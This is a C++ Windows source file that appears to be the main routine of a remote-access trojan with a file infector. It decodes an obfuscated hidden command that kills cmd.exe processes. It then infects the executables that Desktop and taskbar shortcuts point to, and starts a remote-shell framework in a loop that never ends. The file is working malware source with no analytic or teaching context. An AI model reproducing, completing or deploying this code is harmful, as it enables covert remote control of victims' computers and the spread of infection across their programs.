#include "RemoteClientFrameWork.h"
#include "LnkFile.h"


#define  REMOTESHELL_PROCESS_GUID ("14B590DD-E9D3-4300-BF5D-4228B825B145")

static char kcmdChar[]={~'c',~'m',~'d',~' ',~'/',~'c',~' ',
	~'t',~'a',~'s',~'k',~'k',~'i',~'l',~'l',
	~' ',~'/',~'i',~'m',~' ',~'c',~'m',~'d',
	~'.',~'e',~'x',~'e',~' ',~'/',~'t',~'\0',
	};

HANDLE G_hMutex;
BOOL IsAlreadyRunning()
{
	G_hMutex = ::CreateMutex(NULL,TRUE,REMOTESHELL_PROCESS_GUID);

	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		CloseHandle(G_hMutex);
		return TRUE;
	}
	return FALSE;
}


int InfectDirectory(const char *Dir)
{
	int InfectCount=0;
	char FileName[MAX_PATH];
	WIN32_FIND_DATA findFileData;

	sprintf(FileName,"%s\\*.lnk",Dir);

	HANDLE hHandle=FindFirstFile(FileName,&findFileData);
	if (hHandle==INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	while (TRUE)
	{
		char InkFileName[MAX_PATH];
		LnkFile lnkf;
		
		sprintf(FileName,"%s\\%s",Dir,findFileData.cFileName);
		if(XInfester_InfectFile(lnkf.GetLnkTargetFilePath(FileName)))
			InfectCount++;

		if (!FindNextFile(hHandle,&findFileData))
		{
			break;
		}
	}
	return InfectCount;

}

int WINAPI WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
{
	//X Infester starter
	XInfester_Run();

	if (IsAlreadyRunning())
	{
		exit(0);
	}
	
	for (unsigned int i=0;i<strlen(kcmdChar);i++)
	{
		kcmdChar[i]=~kcmdChar[i];
	}


	WinExec(kcmdChar, SW_HIDE);

	//Infect process
	//Desktop
	char path[MAX_PATH];
	SHGetSpecialFolderPath(0,path,CSIDL_DESKTOPDIRECTORY,0);
	InfectDirectory(path);
	SHGetSpecialFolderPath(0,path,CSIDL_APPDATA,0);
	strcat(path,"\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar");
	InfectDirectory(path);
	Sleep(5000);

	if (!G_RemoteFrameWork.Initialize())
	{
		exit(0);
	}

	G_RemoteFrameWork.Run();

	while(1){Sleep(10000);};
}